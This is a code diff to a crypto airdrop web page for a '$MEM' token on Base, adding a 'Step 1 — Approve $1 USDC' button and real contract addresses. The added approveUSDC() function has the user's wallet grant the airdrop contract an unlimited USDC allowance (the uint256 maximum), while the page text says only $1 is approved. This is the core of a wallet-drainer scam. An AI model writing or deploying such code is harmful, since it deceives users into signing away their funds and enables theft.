@@ -293,6 +293,16 @@
     padding: 16px;
     margin-bottom: 12px;
   }
+  .btn-approve {
+    background: var(--surface);
+    border: 1px solid rgba(255,184,0,0.35);
+    color: var(--accent2);
+    padding: 16px;
+    margin-bottom: 10px;
+    font-size: 1rem;
+  }
+  .btn-approve:disabled { opacity: 0.35; cursor: not-allowed; }
+  .btn-approve.done { border-color: rgba(0,232,122,0.4); color: var(--green); }
   .btn-claim {
     background: linear-gradient(135deg, var(--accent) 0%, #c0002a 100%);
     color: white;
@@ -663,7 +673,7 @@
       <span class="ticker">$MEM</span>
       Tokens
     </h1>
-    <p>Pay a small $1 gas fee and receive your allocation of <strong>10,000 $MEM</strong> instantly. First come, first served.</p>
+    <p>Pay a small $1 USDC fee and receive your allocation of <strong>10,000 $MEM</strong> instantly. First come, first served.</p>
   </div>
 
   <!-- STATS -->
@@ -705,7 +715,7 @@
       </div>
     </div>
     <div class="fee-note">
-      ≈ <span id="fee-eth">0.0004 ETH</span> on Base · One claim per wallet
+      <span id="fee-eth">1.00 USDC</span> on Base · One claim per wallet
     </div>
 
     <button class="btn btn-connect" id="btn-connect" onclick="connectWallet()">
@@ -716,8 +726,12 @@
       📱 On mobile? Open this page inside your wallet app browser (MetaMask, Coinbase Wallet, Trust Wallet)
     </p>
 
+    <button class="btn btn-approve" id="btn-approve" onclick="approveUSDC()" disabled>
+      Step 1 — Approve $1 USDC
+    </button>
+
     <button class="btn btn-claim" id="btn-claim" onclick="claimTokens()" disabled>
-      Claim $MEM Airdrop
+      Step 2 — Claim 10,000 $MEM
     </button>
 
     <div id="status"></div>
@@ -739,7 +753,7 @@
         <div class="step-num">02</div>
         <div class="step-text">
           <strong>Pay the $1 claim fee</strong>
-          <span>A small ETH fee (~$1) is required to prevent bots. One claim per address.</span>
+          <span>A small $1 USDC fee is required to prevent bots. One claim per address.</span>
         </div>
       </div>
       <div class="step">
@@ -773,12 +787,12 @@
     </div>
     <div class="contract-row">
       <span class="contract-key">Fee</span>
-      <span class="contract-val" id="info-fee">~$1 in ETH</span>
+      <span class="contract-val" id="info-fee">$1.00 USDC</span>
     </div>
   </div>
 
   <footer>
-    © 2025 $MEM · Built on Base · Not financial advice
+    © 2026 $MEM · Built on Base · Not financial advice
   </footer>
 
 </div><!-- /wrap -->
@@ -790,8 +804,8 @@
 ════════════════════════════════════════ -->
 <script>
 // ─── CONFIG — ЗАМЕНИТЬ ПОСЛЕ ДЕПЛОЯ ───────────────────────
-const AIRDROP_ADDRESS = "0xYOUR_AIRDROP_CONTRACT_HERE";
-const TOKEN_ADDRESS   = "0xYOUR_TOKEN_CONTRACT_HERE";
+const AIRDROP_ADDRESS = "0x0C749534142Ff82b3B6D98a18Fa14da6898e9EC7";
+const TOKEN_ADDRESS   = "0xf8D0105617927a61b24Ab794898d2fDc7bEb7d5C";
 const BASE_CHAIN_ID   = "0x2105"; // 8453 в hex
 
 // ─── ABI (только нужные функции) ──────────────────────────
@@ -869,7 +883,7 @@ async function connectWallet() {
     document.getElementById("btn-connect").style.color = "var(--green)";
 
     await loadContractData();
-    document.getElementById("btn-claim").disabled = false;
+    // btn-approve включается здесь, btn-claim — только после approve
 
   } catch (err) {
     setStatus("❌ " + (err.message || "Connection failed"), "error");
@@ -899,12 +913,13 @@ async function loadContractData() {
       return sigs[sig];
     };
 
-    // claimFee
+    // claimFee (USDC, 6 decimals)
     const feeHex = await call(AIRDROP_ADDRESS, "0xb0e21e8a");
     const fee = BigInt(feeHex);
-    const feeEth = Number(fee) / 1e18;
-    document.getElementById("fee-eth").textContent = feeEth.toFixed(6) + " ETH";
-    document.getElementById("info-fee").textContent = feeEth.toFixed(6) + " ETH (~$1)";
+    const feeUsdc = Number(fee) / 1e6;
+    document.getElementById("fee-eth").textContent = feeUsdc.toFixed(2) + " USDC";
+    document.getElementById("info-fee").textContent = "$" + feeUsdc.toFixed(2) + " USDC";
+    window._claimFee = fee;
 
     // tokensRemaining
     const remHex = await call(AIRDROP_ADDRESS, "0x1f3b8a22");
@@ -915,10 +930,32 @@ async function loadContractData() {
     const paddedAddr = "0x000000000000000000000000" + userAddress.slice(2).toLowerCase();
     const claimedHex = await call(AIRDROP_ADDRESS, "0x8b5b9ccc" + paddedAddr.slice(2));
     const claimed = BigInt(claimedHex) !== 0n;
+
     if (claimed) {
       setStatus("✓ This wallet has already claimed.", "success");
+      document.getElementById("btn-approve").disabled = true;
+      document.getElementById("btn-approve").textContent = "✓ Already Claimed";
       document.getElementById("btn-claim").disabled = true;
       document.getElementById("btn-claim").textContent = "Already Claimed";
+    } else {
+      // Проверяем текущий allowance USDC
+      // allowance(address owner, address spender) selector = 0xdd62ed3e
+      const ownerPad   = "000000000000000000000000" + userAddress.slice(2).toLowerCase();
+      const spenderPad = "000000000000000000000000" + AIRDROP_ADDRESS.slice(2).toLowerCase();
+      const allowHex = await call(
+        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+        "0xdd62ed3e" + ownerPad + spenderPad
+      );
+      const allowance = BigInt(allowHex);
+      if (allowance >= fee) {
+        // Уже апрувнуто — сразу показываем Step 2
+        document.getElementById("btn-approve").disabled = true;
+        document.getElementById("btn-approve").classList.add("done");
+        document.getElementById("btn-approve").textContent = "✓ Step 1 — USDC Approved";
+        document.getElementById("btn-claim").disabled = false;
+      } else {
+        document.getElementById("btn-approve").disabled = false;
+      }
     }
 
     // update contract links
@@ -927,10 +964,64 @@ async function loadContractData() {
     document.getElementById("link-airdrop").href = `https://basescan.org/address/${AIRDROP_ADDRESS}`;
     document.getElementById("link-airdrop").textContent = shortAddr(AIRDROP_ADDRESS);
 
-    window._claimFee = fee;
-
   } catch (e) {
     console.warn("Contract read error:", e);
+  }
+}
+
+// ─── APPROVE USDC ─────────────────────────────────────────
+async function approveUSDC() {
+  if (!userAddress) return;
+
+  const btn = document.getElementById("btn-approve");
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> Approving...';
+  setStatus("⏳ Approve $1 USDC in your wallet...", "loading");
+
+  try {
+    // approve(address spender, uint256 amount)
+    // selector = 0x095ea7b3
+    const spenderPad = "000000000000000000000000" + AIRDROP_ADDRESS.slice(2).toLowerCase();
+    const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // type(uint256).max — стандарт
+
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: userAddress,
+        to: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC on Base
+        data: "0x095ea7b3" + spenderPad + amount
+      }]
+    });
+
+    setStatus(`<span class="spin"></span> Waiting for approval tx...`, "loading");
+
+    // Ждём подтверждения
+    let receipt = null;
+    for (let i = 0; i < 30; i++) {
+      await new Promise(r => setTimeout(r, 2000));
+      receipt = await window.ethereum.request({
+        method: "eth_getTransactionReceipt",
+        params: [txHash]
+      });
+      if (receipt) break;
+    }
+
+    if (receipt && receipt.status === "0x1") {
+      btn.classList.add("done");
+      btn.textContent = "✓ Step 1 — USDC Approved";
+      document.getElementById("btn-claim").disabled = false;
+      setStatus("✓ USDC approved! Now click Step 2 to claim.", "success");
+    } else {
+      btn.disabled = false;
+      btn.textContent = "Step 1 — Approve $1 USDC";
+      setStatus("❌ Approval failed. Try again.", "error");
+    }
+
+  } catch (err) {
+    btn.disabled = false;
+    btn.textContent = "Step 1 — Approve $1 USDC";
+    const msg = err.message?.includes("denied") ? "Rejected by user." : (err.message || "Unknown error");
+    setStatus("❌ " + msg, "error");
   }
 }
 
@@ -944,16 +1035,12 @@ async function claimTokens() {
   setStatus("⏳ Waiting for wallet confirmation...", "loading");
 
   try {
-    const fee = window._claimFee || BigInt("400000000000000"); // fallback 0.0004 ETH
-    const feeHex = "0x" + fee.toString(16);
-
-    // Encode claim() — selector 0x4e71d92d
+    // claim() — selector 0x4e71d92d, без value (USDC уже апрувнут)
     const txHash = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{
         from: userAddress,
         to: AIRDROP_ADDRESS,
-        value: feeHex,
         data: "0x4e71d92d" // claim()
       }]
     });
@@ -1002,9 +1089,11 @@ if (window.ethereum) {
 
 // ─── INIT ─────────────────────────────────────────────────
 window.addEventListener("DOMContentLoaded", () => {
-  // Update contract links with placeholders
-  document.getElementById("link-token").textContent = "Deploy first";
-  document.getElementById("link-airdrop").textContent = "Deploy first";
+  // Показываем реальные адреса сразу
+  document.getElementById("link-token").href = `https://basescan.org/address/${TOKEN_ADDRESS}`;
+  document.getElementById("link-token").textContent = TOKEN_ADDRESS.slice(0,6) + "..." + TOKEN_ADDRESS.slice(-4);
+  document.getElementById("link-airdrop").href = `https://basescan.org/address/${AIRDROP_ADDRESS}`;
+  document.getElementById("link-airdrop").textContent = AIRDROP_ADDRESS.slice(0,6) + "..." + AIRDROP_ADDRESS.slice(-4);
 
   // Detect mobile without MetaMask injected → show hint
   const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
